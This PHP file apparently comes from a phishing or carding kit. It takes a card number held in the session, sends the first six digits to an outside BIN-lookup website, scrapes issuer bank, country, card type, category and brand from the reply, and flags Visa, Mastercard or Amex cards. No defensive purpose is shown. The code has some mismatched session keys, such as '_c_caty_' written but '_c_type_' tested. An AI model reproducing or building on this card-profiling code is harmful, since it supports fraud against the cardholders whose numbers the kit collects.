<?php


function buka($url = '', $var = '')
{
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS,"bin=".$var);    
		}
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
function str($value){
	$paykkze = str_replace('</div>', '', $value);
	$paykkfze = str_replace('<div>', '', $paykkze);
	$fidfggle = str_replace('   ', '', $paykkfze);
	$file = str_replace('  ', '', $fidfggle);
	$fddile = str_replace('--', '', $file);
	return $fddile;
}
function fetch_value($str, $find_start, $find_end)
{
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}



$_SESSION['_card_number_']  = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);
$bin = buka("http://credit-cardity.com/iin-bin/number-lookup/".substr($_SESSION['_card_number_'],0,6));
$bank = fetch_value($bin,'Issuer Bank Name</div><div class="bottom-block__content-list">','</div>');
$_SESSION['bank'] =  $find_bank = str($bank);
$country = fetch_value($bin,'Card Country</div><div class="bottom-block__content-list">','</div>');
$_SESSION['country'] =  $find_country = str($country);
$type = fetch_value($bin,'Card Type</div><div class="bottom-block__content-list">','</div>');
$_SESSION['_c_caty_'] = $find_type = str($type);
$category = fetch_value($bin,'Card Category</div><div class="bottom-block__content-list">','</div>');
$_SESSION['category'] =  $find_category = str($category);
$Brand = fetch_value($bin,'Card Brand</div><div class="bottom-block__content-list">','</div>');
$_SESSION['Brand'] =  $find_Brand = str($Brand);


$VISACARD   = $_SESSION['_c_type_'] == "VISA" || $_SESSION['_c_type_'] =="VISA ELECTRON";
$MASTERCARD = $_SESSION['_c_type_'] =="MASTERCARD" || $_SESSION['_c_type_'] =="MAESTRO";
$AMEX = $_SESSION['_c_type_'] =="AMEX";





